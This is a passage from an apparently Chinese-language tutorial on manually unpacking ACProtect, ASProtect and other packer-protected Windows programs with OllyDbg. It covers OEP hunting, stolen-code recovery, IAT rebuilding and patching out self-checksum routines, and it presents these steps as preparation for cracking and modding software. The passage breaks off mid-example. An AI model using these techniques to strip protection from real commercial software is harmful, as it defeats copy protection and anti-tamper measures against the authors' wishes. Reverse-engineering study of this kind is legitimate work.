asset_img ACProtect132.png ACProtect1.32 %}\n\n运行一下程序，发现会弹一个ACProtect壳的NAG窗口，再进入到主程序。\n\n载入OD，选项->调试设置->异常->将非法访问内存取消勾选，插件->SrtongOD->options->将skip some exceptions取消勾选。用最后一次异常法，发现它在第2次Shift+F9跑飞了。所以在第1次Shift+F9(如果第一次就跑飞的话用F9)后，选中堆栈窗口的`SE处理程序`右键->数据窗口中跟随，在数据窗口中的第一个字节下一个内存访问断点，Shift+F9运行。在反汇编窗口下断点，Shift+F9，再次下断点，Shift+F9。在`B`模块取消软件断点。如何删除内存访问断点呢？直接右键->断点->删除内存断点即可。去到`M`模块，选中程序领空的`.text`区段右键->在访问上设置中断，Shift+F9，弹出NAG窗口，点确定后直达OEP。\n\n用importREC修复IAT，Scylla会加载出非常多无效指针。\n\n### 4.12.2 Ultraprotect 1.x(stolen code)\n\n查壳显示Ultraprotect壳，这是ACProtect以前的名字，EP区段都显示`.perplex`。\n\n这次运行没有NAG窗口。与上述操作一致，到达“OEP”。\n\n```asm\n004010D2    56              push esi\n004010D3    FF15 E4634000   call dword ptr ds:[0x4063E4]             ; notepad9.0040D1BA\n```\n\n这“OEP”长得非常奇怪，与我们之前遇到的语言入口特征都不一样。考虑到ACProtect会有偷代码的习惯，所以猜测入口特征被移到了某处。\n\n入口特征最常见的是`push ebp`，先用这个试一下。\n\n同样，删除完3个断点后，F4运行至目前函数的`retn`处。调试->设置条件(Ctrl+T)，勾选“命令是一个”，在输入框填写“push ebp”。调试->跟踪步入(Ctrl+F11)，跟踪需要亿点时间，跟踪完后会跳到某个指令处，刚好就是被偷的入口特征代码。\n\n```asm\n004254C9    55              push ebp\n004254CA    8BEC            mov ebp,esp\n004254CC    83EC 44         sub esp,0x44\n004254CF    60              pushad\n004254D0    60              pushad\n```\n\n后面几个是出栈指令，所以被偷的代码应该是前3条。选中右键->二进制->二进制复制。同样在`M`模块的`.text`下断点，Shift+F9运行至“OEP”。由于前3条指令占6个字节，所以要粘贴在“OEP”前6个字节处(粘贴前要把粘贴的地方的指令先nop掉)。覆盖后代码如下：\n\n```asm\n004010CA    90              nop\n004010CB    90              nop\n004010CC    55              push ebp\n004010CD    8BEC            mov ebp,esp\n004010CF    83EC 44         sub esp,0x44\n004010D2    56              push esi\n```\n\n选中真正的OEP右键->此处为新EIP。接下来就是脱壳了。如果遇到很多无效函数，可以用插件跟踪->ACProtect，也可以用跟踪级别跟踪(注意OD进程跟踪会卡死，所以打开加壳程序跟踪)。\n\n### 4.12.3 Ultraprotect 1.x进阶版\n\n用4.12.2的方法到了跟踪那一步会报错，“无法处理调试异常”。这时，将选项->调试设置->异常->将INT3中断取消勾选，其余勾选。重载，同样用最后一次异常法，取消3个断点后，在命令窗口输入`d 12ffc0`回车，下硬件访问断点，Shift+F9。程序找到Stolen Code。\n\n```asm\n004C9B30    61              popad\n004C9B31    55              push ebp\n004C9B32    8BEC            mov ebp,esp\n004C9B34    6A FF           push -0x1\n```\n\n复制，找到“OEP”往上滑，却发现代码全乱了。\n\n```asm\n004431F9    68 D8B24400     push NetClean.0044B2D8\n004431FE    68 B4334400     push NetClean.004433B4\n```\n\n```asm\n004431F7   /2e:79 68        bhnt jns short 00443262\n004431FA   |D8B2 440068B4   fdiv dword ptr ds:[edx-0x4B97FFBC]\n00443200   |334400 64       xor eax,dword ptr ds:[eax+eax+0x64]\n```\n\n去一下别的模块再回来，发现又好了，就是不能向上滑动。右键->分析->分析代码。这时往上滑正常。将被偷的代码粘贴上去，修改EIP。\n\n脱壳，运行程序异常。这是因为某些ACProtect 1.x壳有自我保护功能，即入口点如果不是原本那个地址可能就运行不了了。加壳程序入口点`4AC000`。将已脱壳程序载入OD，定位到`4AC000`，将被偷代码粘贴，再跳到OEP。\n\n```asm\n004AC000    55              push ebp\n004AC001    8BEC            mov ebp,esp\n004AC003    6A FF           push -0x1\n004AC005  - E9 EA71B9FF     jmp 004431F4\n;jmp 4431F4也可改为push 4431F4, retn\n```\n\n复制到可执行文件。再用LoadPE编辑入口点为`AC000`，程序正常执行。\n\n### 4.12.4 ACProtect 2.0.x\n\n#### 4.12.4.1 VB类\n\n用4.12.1方法直接到达“OEP”`4012CE`。\n\n```asm\n004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain\n004012D4    29BA A821B144   sub dword ptr ds:[edx+0x44B121A8],edi\n004012DA    BC 4DB59200     mov esp,0x92B54D\n004012DF    0000            add byte ptr ds:[eax],al\n004012E1    0000            add byte ptr ds:[eax],al\n```\n\n根据语言的编译特点，发现它是VB程序。以下就是VB程序的典型例子。第一条指令`push`，第二条指令`call`，双击call指令就可知道call的地址`call 00401044`，刚好是OEP的上面一条`jmp 系统函数`指令。运行到这条jmp指令时，堆栈窗口的第二条就是push的地址。\n\n```asm\n00401044   $- FF25 18104000 jmp dword ptr ds:[<&MSVBVM60.#ThunRTMain_100>]     ;  msvbvm60.ThunRTMain\n0040104A   ?  0000          add byte ptr ds:[eax],al\n0040104C > $  68 3C1F4000   push 吾爱破解.00401F3C                                 ;  ASCII \"VB5!\u001c#vb6chs.dll\"\t\tOEP\n00401051   .  E8 EEFFFFFF   call <jmp.&MSVBVM60.#ThunRTMain_100>\n```\n\n```asm\n0012FFBC   00401056  返回到 吾爱破解.00401056 来自 <jmp.&MSVBVM60.#ThunRTMain_100>\n0012FFC0   00401F3C  ASCII \"VB5!\u001c#vb6chs.dll\"\n```\n\n模仿典型例子修改代码：\n\n```asm\n004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain\n004012D4    68 54474000     push QQ个性签.00404754\n004012D9    E8 F0FFFFFF     call QQ个性签.004012CE                      ; jmp 到 msvbvm60.ThunRTMain\n```\n\n在真正OEP`4012D4`处右键->此处为新EIP，脱壳。\n\n#### 4.12.4.2 Delphi\n\n这次的壳发现取消勾选“非内存访问”或“INT3”或两个都取消，都直接跑飞。换方法。\n\n在命令窗口输入`bp GetCurrentProcessId`回车，运行，取消断点。用LoadPE查看程序的PID为`8C8`(每次都会变)。\n\n```asm\n7C8099C0 >  64:A1 18000000  mov eax,dword ptr fs:[0x18]\n7C8099C6    8B40 20         mov eax,dword ptr ds:[eax+0x20]          ; comctl_1.<ModuleEntryPoint>\n7C8099C9    C3              retn\n```\n\n修改为：\n\n```asm\n7C8099C0 >  B8 64050000     mov eax,0x564\n7C8099C5    90              nop\n7C8099C6    90              nop\n7C8099C7    90              nop\n7C8099C8    90              nop\n7C8099C9    C3              retn\n```\n\n光标处修改为PID，下面指令都nop掉。\n\n在命令窗口输入`bp GetModuleHandleA`回车，运行，取消断点。去到`M`模块，在CODE设置访问中断(F2)，F9运行，出现NAG窗口，点确定后，来到OEP。\n\n### 4.12.5 另类方法解ACProtect\n\nACProtect 1.4x\n\n取消勾选“非法内存访问”和“int3中断”都跑飞。用4.12.4.2方法找到“OEP”。用4.12.2寻找Stolen Code跟踪时间太过漫长，可以用另一种办法。\n\n```asm\n0040A54C    50              push eax                                 ; 跑跑排行.00400000\n0040A54D    E8 1B030000     call 跑跑排行.0040A86D\n0040A552    8945 98         mov dword ptr ss:[ebp-0x68],eax          ; 跑跑排行.00400000\n```\n\n重载，看到有`pushad`，试一下用ESP定律，硬件断点先别删除，再用最后一次异常法。Shift+F9连续13次到达最佳脱壳地点。\n\n```asm\n00441E4D    64:A1 00000000  mov eax,dword ptr fs:[0]\n00441E53    8905 39CA4200   mov dword ptr ds:[0x42CA39],eax\n00441E59    FF35 39CA4200   push dword ptr ds:[0x42CA39]\n```\n\n但是脱壳却说这个位置没有函数。在importREC先填写OEP为`A54C`，获取输入表修复IAT后，再将OEP改为`41E4D`，转储到文件。\n\n程序正常运行，查壳说还有壳，但已经可以进行破解美化DIY了。\n\n### 4.12.6 补区段\n\nACProtect壳会对`MessageBoxA`和`ReigisterHotKey`进行处理，所以我们要在它进行处理的地方nop掉不让它处理。\n\n将所有忽略异常勾选，在`M`模块的`.rdata`处下断运行(没有`.rdata`用`.idata`)。单步跟踪看注释窗口出现这两个API函数，把它下面的跳转指令nop掉。\n\n```asm\n0043396D    3B85 9CE24100   cmp eax,dword ptr ss:[ebp+0x41E29C]      ; user32.MessageBoxA\n00433973    74 20           je short NgaMy.00433995;nop\n00433975    90              nop\n00433976    90              nop\n00433977    90              nop\n00433978    90              nop\n00433979    3B85 9D014100   cmp eax,dword ptr ss:[ebp+0x41019D]      ; user32.RegisterHotKey\n0043397F    74 09           je short NgaMy.0043398A;nop\n```\n\n再继续往下有magic跳，改JMP。\n\n```asm\n004339C0    80BD D2594100 0>cmp byte ptr ss:[ebp+0x4159D2],0x0\n004339C7    74 57           je short NgaMy.00433A20;jmp\n```\n\n在`M`模块的`.text`下访问中断，Shift+F9运行到此处。\n\n```asm\n00403D38    68 8C3D4000     push NgaMy.00403D8C\n00403D3D    64:A1 00000000  mov eax,dword ptr fs:[0]\n00403D43    50              push eax\n00403D44    8B4424 10       mov eax,dword ptr ss:[esp+0x10]\n00403D48    896C24 10       mov dword ptr ss:[esp+0x10],ebp\n00403D4C    8D6C24 10       lea ebp,dword ptr ss:[esp+0x10]\n00403D50    2BE0            sub esp,eax\n00403D52    53              push ebx\n00403D53    56              push esi\n00403D54    57              push edi\n00403D55    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]           ; kernel32.7C817080\n00403D58    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n00403D5B    50              push eax\n00403D5C    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]\n00403D5F    C745 FC FFFFFFF>mov dword ptr ss:[ebp-0x4],-0x1\n00403D66    8945 F8         mov dword ptr ss:[ebp-0x8],eax\n00403D69    8D45 F0         lea eax,dword ptr ss:[ebp-0x10]\n00403D6C    64:A3 00000000  mov dword ptr fs:[0],eax\n00403D72    C3              retn\n```\n\nF4去到`retn`处，F8返回父函数。再去到`M`模块`.text`设置内存访问断点运行，F4去到`retn`处，F8返回父函数。再去到`M`模块`.text`设置内存访问断点运行，F4去到`retn`处，F8返回父函数。到达“OEP”。\n\n```asm\n0040305C    83F9 02         cmp ecx,0x2\n0040305F    74 0C           je short NgaMy.0040306D\n00403061    81CE 00800000   or esi,0x8000\n00403067    8935 B0DE4000   mov dword ptr ds:[0x40DEB0],esi\n```\n\n用Scylla脱壳(因为用PEtools和LoadPE脱都显示错误)，在importREC输入偏移地址，自动获取输入表没有函数，自己手动查找IAT，起始地址A000，大小174。\n\n下一步，加壳程序重载，用ESP定律。F9运行5次来到这里：\n\n```asm\n004365F4    8915 F5FD4100   mov dword ptr ds:[0x41FDF5],edx          ; ntdll.KiFastSystemCallRet\n004365FA    FF35 F5FD4100   push dword ptr ds:[0x41FDF5]\n00436600    8F05 2DFE4100   pop dword ptr ds:[0x41FE2D]              ; kernel32.7C817077\n00436606    FF35 2DFE4100   push dword ptr ds:[0x41FE2D]\n0043660C    C70424 60000000 mov dword ptr ss:[esp],0x60\n00436613    56              push esi\n00436614    890C24          mov dword ptr ss:[esp],ecx\n00436617    68 8DFD4100     push NgaMy.0041FD8D\n0043661C    59              pop ecx                                  ; kernel32.7C817077\n0043661D    8919            mov dword ptr ds:[ecx],ebx\n0043661F    8B0C24          mov ecx,dword ptr ss:[esp]               ; kernel32.7C817077\n00436622    8F05 ADFE4100   pop dword ptr ds:[0x41FEAD]              ; kernel32.7C817077\n00436628    FF35 8DFD4100   push dword ptr ds:[0x41FD8D]\n0043662E    C70424 48A24000 mov dword ptr ss:[esp],NgaMy.0040A248\n00436635    8905 B9FD4100   mov dword ptr ds:[0x41FDB9],eax\n0043663B    FF35 B9FD4100   push dword ptr ds:[0x41FDB9]\n00436641    90              nop\n00436642    90              nop\n00436643    60              pushad\n00436644    E8 01000000     call NgaMy.0043664A\n```\n\n将`pushad`前的代码二进制复制下来：\n\n```asm\n89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56\n89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40\n00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00\n```\n\n取消硬件断点，F4去到`pushad`的下一条指令，在寄存器窗口找ESP，继续用ESP定律。\n\n```asm\n00436F16    68 1DFD4100     push NgaMy.0041FD1D\n00436F1B    58              pop eax\n00436F1C    8930            mov dword ptr ds:[eax],esi               ; NgaMy.00403D38\n00436F1E    8F05 79FC4100   pop dword ptr ds:[0x41FC79]\n00436F24    8B05 79FC4100   mov eax,dword ptr ds:[0x41FC79]\n00436F2A    FF35 1DFD4100   push dword ptr ds:[0x41FD1D]\n00436F30    56              push esi                                 ; NgaMy.00403D38\n00436F31    891C24          mov dword ptr ss:[esp],ebx\n00436F34    C70424 383D4000 mov dword ptr ss:[esp],NgaMy.00403D38\n00436F3B    8B3424          mov esi,dword ptr ss:[esp]\n00436F3E    8F05 A5FE4100   pop dword ptr ds:[0x41FEA5]              ; NgaMy.00403D38\n00436F44    8905 01FF4100   mov dword ptr ds:[0x41FF01],eax\n00436F4A    FF35 01FF4100   push dword ptr ds:[0x41FF01]\n00436F50    891C24          mov dword ptr ss:[esp],ebx\n00436F53    56              push esi                                 ; NgaMy.00403D38\n00436F54    C70424 45FE4100 mov dword ptr ss:[esp],NgaMy.0041FE45\n00436F5B    8F05 31FE4100   pop dword ptr ds:[0x41FE31]              ; NgaMy.0041FE45\n00436F61    90              nop\n00436F62    90              nop\n00436F63    60              pushad\n00436F64    E8 01000000     call NgaMy.00436F6A\n```\n\n```asm\n68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 00 FF 35 1D FD 41 00 56 89 1C 24 C7 04\n24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 00 FF 35 01 FF 41 00 89 1C 24 56 C7 04\n24 45 FE 41 00 8F 05 31 FE 41 00\n```\n\n重复操作n次，到达OEP。\n\nESP有：12FFA4、12FF98、12FF94、12FF24、12FF1C、12FF20、12FF1C、12FF1C、12FE8C、12FE8C、12FE90。\n\n在12FE90处下断点后运行到达jmp指令，F8去到一个大跳转，跳到“OEP”。\n\n```asm\n0043BE77   /EB 01               jmp short NgaMy.0043BE7A  \n```\n\n```asm\n0043BE7A  - FF25 BCBE4300   jmp dword ptr ds:[0x43BEBC]              ; NgaMy.0040305C\n```\n\n```asm\n0040305C    83F9 02         cmp ecx,0x2\n0040305F    74 0C           je short NgaMy.0040306D\n```\n\n二进制代码汇总：\n\n```asm\n89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56\n89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40\n00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00 68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 \n00 FF 35 1D FD 41 00 56 89 1C 24 C7 04 24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 \n00 FF 35 01 FF 41 00 89 1C 24 56 C7 04 24 45 FE 41 00 8F 05 31 FE 41 00 8B 1D 31 FE 41 00 89 33 \n8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41 00 FF 35 21 FC 41 00 C7 \n05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B 1D FD FB 41 00 FF 15 45 \nFE 41 00 89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 \n00 89 3E 5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE \n41 00 FF 35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00 8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 \nFF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41 00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 \n89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05 95 FC 41 00 8B 05 95 FC 41 00 53 8F 05 5D FE \n41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41 00 89 1D 89 \nFE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41 00 57 89 04 \n24 89 0C 24 8B 04 24 8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 \nFF 35 BD FE 41 00 51 B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF \n35 A9 FE 41 00 8B 3C 24 8F 05 95 FD 41 00 89 1D 29 FD 41 00 FF 35 29 FD 41 00 8B DF 8B D3 5B 8F \n05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00 5B 89 13 8B 1C 24 8F 05 49 FE 41 00 \n8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25 C5 FD 41 00 89 1D 21 FD 41 00 FF 35 \n21 FD 41 00 68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 \nF5 FE 41 00 89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 \nC7 04 24 AC DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A 8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B \n46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF 35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C \n81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35 FE 41 00 8F 05 B0 DE 40 00\n```\n\n用topo工具在脱壳修复后的程序申请一个新的区段，数以上字节数或直接输入1000，记下起始的地址：0043E000。OD打开脱完壳后的程序，找到0043E000，粘贴入代码，记住，后面得加跳向假OEP的代码！！保存。\n\n```asm\nJMP 0040305C \n```\n\n用LoadPE修正入口点为3E000。\n\n### 4.12.7 AC脱壳出现的问题\n\n1. **用LoadPE无法抓取进程内存**。用Scylla填入OEP，获取输入表，不用管无效函数，转储到文件。再用importREC或Scylla重建IAT。\n2. **用importREC填入OEP无法获取输入表**。用Scylla重建IAT，但剪切指针时可能麻烦一点。\n\n## 4.13 ASProtect\n\n### 4.13.1 ASProtect 1.2\n\n选项->调试设置->异常，将所有异常取消勾选。用最后一次异常法，Shift+F9运行19次。在`retn`处F2->Shift+F9->F2。去到`M`模块，在401000处下断运行，直接去到OEP。\n\n```asm\n0040A41E    55              push ebp\n0040A41F    8BEC            mov ebp,esp\n0040A421    6A FF           push -0x1\n0040A423    68 C8CB4000     push 跑跑赛道.0040CBC8\n0040A428    68 A4A54000     push 跑跑赛道.0040A5A4\n```\n\n### 4.13.2 ASProtect 1.23 RC1\n\n取消勾选“非法内存访问”，最后一次异常法。Shift+F9运行16次。用4.13.1的方法找到OEP。\n\n也可以用另一种方法。运行到`retn`后，查看堆栈窗口的`400000`下的第二行的数值`12FFA4`。在命令窗口下硬件断点`hr 12FFA4`，运行，F8经过一个大跳转也可去到OEP。\n\n```asm\n0012FF5C   00A0381C\n0012FF60   00400000  跑跑排行.00400000\n0012FF64   3D375BA5\n0012FF68   0012FFA4\n```\n\n脱壳正常运行。\n\n也可以用asprdbgr脱壳辅助工具打开加壳程序，让它自动修复IAT，打开importREC发现只有3个无效指针了，直接剪切掉。同样可以运行。\n\n### 4.13.3 ASProtect 1.23 RC4\n\n判断ASProtect版本：\n\n1. ASProtect 1.23 RC4 按shift+f9键26次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到fake oep。\n\n\n2. ASProtect 1.31 04.27 按shift+f9键36次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n3. ASProtect 1.31 05.18 按shift+f9键40次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n4. ASProtect 1.31 06.14 按shift+f9键38次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。\n\n用最后一次异常法可能判断不准确，也可以用PEID的VerA插件区分版本。\n\n{% asset_img ASProtect123rc4.jpg ASProtect123rc4 %}\n\n[1]表示上述第一个版本RC4。\n\n取消勾选“非法访问内存”，Shift+F9运行26次，在`retn`处F2->Shift+F9->F2。去到`M`模块，在401000处下断运行，直接去到FOEP。\n\n```asm\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n004F27D5    33D2            xor edx,edx                              ; ntdll.KiFastSystemCallRet\n004F27D7    8AD4            mov dl,ah\n004F27D9    8915 34306900   mov dword ptr ds:[0x693034],edx          ; ntdll.KiFastSystemCallRet\n```\n\n找回被偷代码，取消勾选“非法访问内存”，Shift+F9运行26次，在`retn`处F2->Shift+F9->F2。查看堆栈窗口的`400000`往下数第二行数值为`12FFA4`，在命令窗口输入`hr 12FFA4`下硬件断点，运行。\n\n```asm\n0012FF5C   00C86804\n0012FF60   00400000  SoWorker.00400000\n0012FF64   E3DE7228\n0012FF68   0012FFA4\n```\n\n一路F8跟到以下，call跟进去。\n\n```asm\n00C8544B    BD 5154C800     mov ebp,0xC85451\n00C85450    FF55 03         call dword ptr ss:[ebp+0x3]\n```\n\n发现类似于OEP开头：\n\n```asm\n00C8547A    55              push ebp\n00C8547B    8BEC            mov ebp,esp\n00C8547D    6A FF           push -0x1\n00C8547F    68 78E35300     push 0x53E378\n00C85484    68 407B4F00     push 0x4F7B40\n00C85489    64:A1 00000000  mov eax,dword ptr fs:[0]\n00C8548F   /EB 01           jmp short 00C85492\n```\n\n将jmp以上(不包含jmp)的代码二进制复制\n\n```asm\n55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00\n```\n\n执行jmp到以下代码，再复制\n\n```asm\n00C85492    50              push eax\n00C85493    64:8925 0000000>mov dword ptr fs:[0],esp\n00C8549A    83EC 58         sub esp,0x58\n00C8549D    EB 01           jmp short 00C854A0\n```\n\n```asm\n50 64 89 25 00 00 00 00 83 EC 58\n```\n\n以此类推\n\n```asm\n00C854A0    53              push ebx\n```\n\n```asm\n53\n```\n\n```asm\n00C854A4    56              push esi\n```\n\n```asm\n56\n```\n\n```asm\n00C854A8    57              push edi                                 ; SoWorker.006CF040\n00C854A9    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n00C854AC    26:eb 01        jmp short 00c854b0\n```\n\n```asm\n57 89 65 E8\n```\n\n汇总一下代码：\n\n```asm\n55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58 53 56 57 89 65 E8\n```\n\n一路F7到这里，再一路F8去到`retn`，返回父函数。\n\n```asm\n00C85378    51              push ecx\n00C85379    57              push edi                                 ; SoWorker.006CF040\n00C8537A    9C              pushfd\n00C8537B    FC              cld\n00C8537C    BF B953C800     mov edi,0xC853B9\n00C85381    B9 5E140000     mov ecx,0x145E\n00C85386    F3:AA           rep stos byte ptr es:[edi]\n00C85388    9D              popfd\n00C85389    5F              pop edi                                  ; SoWorker.004F27CF\n00C8538A    59              pop ecx                                  ; SoWorker.004F27CF\n00C8538B    C3              retn\n```\n\n直接来到FOEP，上面全为0是因为真正的OEP被移到了别处，刚才所做的操作就是把OEP拼接起来。\n\n```asm\n004F27C9    0000            add byte ptr ds:[eax],al\n004F27CB    0000            add byte ptr ds:[eax],al\n004F27CD    0000            add byte ptr ds:[eax],al\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n```\n\n将刚才复制的代码粘贴在它的上方。\n\n```asm\n004F27A9    55              push ebp\n004F27AA    8BEC            mov ebp,esp\n004F27AC    6A FF           push -0x1\n004F27AE    68 78E35300     push SoWorker.0053E378\n004F27B3    68 407B4F00     push SoWorker.004F7B40\n004F27B8    64:A1 00000000  mov eax,dword ptr fs:[0]\n004F27BE    50              push eax\n004F27BF    64:8925 0000000>mov dword ptr fs:[0],esp\n004F27C6    83EC 58         sub esp,0x58\n004F27C9    53              push ebx\n004F27CA    56              push esi\n004F27CB    57              push edi                                 ; SoWorker.006CF040\n004F27CC    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]\n```\n\n设置EIP指向第一条指令。脱壳。\n\n### 4.13.4 以壳解壳\n\nStolen Code太多，可以用以壳解壳的方法。以壳解壳就是将Stolen Code及Stolen Code所在区段的壳一并放在主程序里。这样会导致比无壳程序多了很多无用代码，文件大小比无壳程序大很多。\n\n与4.13.3操作几乎一致。由于它有ASLR，所以地址与4.13.3会有所不同。FOEP为`4F27CF`，OEP为`C871DE`。\n\n打开LoadPE，修正镜像大小，先完整转存一个，再区域转存OEP所在的区段。在PE编辑器打开脱壳程序，区段->选中最后一个区段右键->从磁盘载入区段，将我们刚才保存的区段载入，右键->编辑区段，程序基址为400000，所在区段起始地址为C80000，所以虚拟地址应为C80000-400000=880000。保存->确定。\n\n选项->重建->只选“使PE有效”。重建PE->载入脱壳程序。\n\n用importREC修复IAT，OEP先填写FOEP，修复好指针后再修改OEP为真正的OEP。程序正常运行。\n\n# 5. 疑难杂症\n\n## 5.1 附加数据的处理方法\n\n{% asset_img 附加数据.png 附加数据 %}\n\nPEID查壳是NSPacK壳，后面写着[overlay]，也就是这个程序有附加数据。\n\noverlay真正的意思是取消打开功能，将这些需要读取的数据放到pe文件的后面，让程序自动运行打开的功能。比如mp3文件需要播放器打开，那mp3文件除了音乐数据还需要附加数据，让播放器读到能通过播放器运行。\n\n如果单纯用NSPacK脱壳方法还不足够，会发现脱壳后的程序运行不了。正确方法是将加壳程序后面的附加数据粘贴到脱壳程序的后面。\n\n用PEID查看区段信息，重点关注最后一个区段的R偏移和R大小。\n\n{% asset_img 附加数据节查看器.jpg 附加数据节查看器 %}\n\n8800h+400h=8C00h\n\n用Win HEX打开加壳程序，Alt+G搜索偏移`8C00`，选第一个字节右键->选块开始，选文件最后一个字节右键->选块结束，右键->编辑->复制选块->正常。打开脱壳后的程序，选中最后一个字节，右键->编辑->剪贴板数据->粘贴，保存。程序正常运行。\n\n## 5.2 自校验的去除方法\n\n用了以上各种方法修复程序都运行不了，可以考虑可能是程序有自校验。\n\n自校验原理：程序会检查自己有没有被修改，如果发现被修改的话，便会离开或进行其它动作。基本的校检方法包括checksum，检查大小，检查跳转代码，等等。\n\n 将脱壳后的程序也用OD载入，在两个OD的命令窗口下断点`bp CreateFileA`回车，Alt+F9执行到用户代码，取消断点。接下来对比两个程序执行的不同之处，主要看条件跳转指令。\n\n```asm\n0040120C   /75 07           jnz short 例子.00401215\n0040120E   |B8 01000000     mov eax,0x1\n00401213   |EB 02           jmp short 例子.00401217\n00401215   \\33C0            xor eax,eax\n```\n\n加壳程序这个跳转不实现，而脱壳程序的这个跳转实现了。只要将脱壳程序的跳转指令修改即可。\n\n```asm\njnz short 例子.00401215\t=>\tjz short 例子.00401215\n```\n\n保存后程序正常运行。\n\n# 6. 脱壳后的简单应用\n\n程序的破解、汉化、美化都要先脱壳才能进行。\n\n## 6.1 软件汉化及DIY \n\n### 6.1.1 VB类\n\nVB程序最好用GetVBRes工具。\n\n### 6.1.2 VC++/VS类\n\nVC++/VS程序可以用Resource Hacker、PEexplorer、xnresource工具。\n\n脱完壳后加载进Resource Hacker，还是显示“有非标准资源”错误提示，说明我们手工脱壳没脱干净，可能在重建IAT时大小设置为1000，导致有很多垃圾指针。可以用fixres修复一下脱壳后的程序。\n\n### 6.1.3 BC++类/Delphi\n\nBC++/Delphi类最好用PEexplorer工具。\n\n# 7. 脱壳练习\n\n## 7.1 kkrunchy 0.23\n\n单步到`push`后用ESP定律，继续F8往下，看到一个大跳转，却没有实现。\n\n```asm\n003FFD5B   /0F84 9F190000   je UnPackMe.00401700\n```\n\n选中右键->跟随，是一大片空代码。右键->断点->硬件执行->F9，原本空代码的地方已经出现了OEP，删除硬件断点。\n\n```asm\n00401700    55              push ebp                                 ; UnPackMe.003F2A08\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 86184000     push UnPackMe.00401886\n```\n\n用单步跟踪、内存镜像法都是要在大跳转那里同样操作才可到达OEP。\n\n脱壳。注意它的基址是`3F0000`，所以OEP的偏移地址为`11700`。\n\n## 7.2 AT4RE Protector\n\nPEID显示yoda's Protector v1.02\n\n载入OD用2次内存镜像法，在`.rsrc`资源段设置内存访问断点(A)，设置访问中断(F2)断不下来，因为会去到DLL领空，记得要取消内存断点。再在PE文件头下一行下访问中断，运行，到达以下：\n\n```asm\n00407101    8A1C06          mov bl,byte ptr ds:[esi+eax]\n00407104    80EB FF         sub bl,0xFF\n00407107    881C06          mov byte ptr ds:[esi+eax],bl\n0040710A    46              inc esi\n0040710B    83FE 32         cmp esi,0x32\n0040710E  ^ 75 F1           jnz short UnPackMe.00407101\n00407110  - FFE0            jmp eax                                  ; UnPackMe.00401700\n```\n\n单步跟到`jmp eax`去到OEP。\n\n## 7.3 ORiEN v2.11 - 2.12\n\n开始用ESP定律，再单步几下就到了OEP。\n\n```asm\n004A1AF1  - FFE0       